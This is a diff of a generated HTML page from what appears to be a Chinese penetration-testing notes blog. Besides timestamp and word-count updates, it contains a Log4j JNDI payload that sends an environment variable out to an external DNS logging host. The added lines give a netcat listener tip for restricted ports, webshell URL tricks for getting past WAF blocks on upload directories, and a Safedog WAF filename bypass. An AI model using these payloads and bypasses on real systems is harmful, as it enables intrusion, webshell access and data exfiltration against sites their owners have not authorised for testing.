@@ -95,7 +95,7 @@
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;02&#x2F;17&#x2F;V56j3K7vDEqBYnF.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;02&#x2F;17&#x2F;SUIhx9mRunD1wbk.png">
-<meta property="og:updated_time" content="2022-02-21T08:44:34.106Z">
+<meta property="og:updated_time" content="2022-03-07T04:40:23.574Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;02&#x2F;17&#x2F;V56j3K7vDEqBYnF.png">
 
@@ -321,7 +321,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  2.6k
+                  2.7k
                 </span>
               
 
@@ -378,7 +378,7 @@
 </li>
 <li><p><code>${jndi:ldap://${env:os}.7fc8ba44.dns.1433.eu.org/aa}</code>    windows<br>具体有什么属性可以外带，可以参考 <a href="https://devdocs.io/openjdk~11/java.base/java/lang/system#getProperties()" target="_blank" rel="noopener">https://devdocs.io/openjdk~11/java.base/java/lang/system#getProperties()</a></p>
 </li>
-<li><p>同时可以利用dns外带信息<br>浅蓝大佬编写的一些log4j2利用方式 <a href="https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg</a></p>
+<li><p>同时可以利用dns外带信息。有些目标可能只能对外来连接特定端口，比如80，443等，这时可以尝试把dns 监听端口改为<code>nc -lup 80</code>来尝试利用<br>浅蓝大佬编写的一些log4j2利用方式 <a href="https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg</a></p>
 <h1 id="文件上传专题"><a href="#文件上传专题" class="headerlink" title="文件上传专题"></a>文件上传专题</h1><p>这里主要分两部分，一个是waf限制导致上传失败，另一个是由于代码本身黑名单限制而导致的上传失败<br>如果是waf限制，通常会有waf拦截页面，或者请求多次被重置reset无响应包。如果是后缀名黑名单通常返回包带有文件格式不允许字样</p>
 </li>
 </ul>
@@ -416,6 +416,8 @@
 </blockquote>
 <h3 id="shell访问"><a href="#shell访问" class="headerlink" title="shell访问"></a>shell访问</h3></li>
 <li><p><em>某些waf可能会阻止访问upload下的脚本文件*</em>，可以<strong>尝试</strong>在后面加<code>/.png</code>之类的绕过，类似<code>http://xxx.xx/upload/shell.php/.png</code>，<code>http://xx.xx/upload/a.png/../shell.php</code></p>
+</li>
+<li><p>安全狗可以直接在文件名后面加/</p>
 <h3 id="内容绕过"><a href="#内容绕过" class="headerlink" title="内容绕过"></a>内容绕过</h3></li>
 <li><p>大文件，脏数据</p>
 </li>
@@ -587,7 +589,7 @@ xxx 部分是要转发的后端，如果 xxx 以斜杠（/）结尾 ，则请求
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">53</span>
+                  <span class="site-state-item-count">57</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -677,7 +679,7 @@ xxx 部分是要转发的后端，如果 xxx 以斜杠（/）结尾 ，则请求
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">206.7k</span>
+    <span title="Site words total count">214.8k</span>
   
 </div>
 
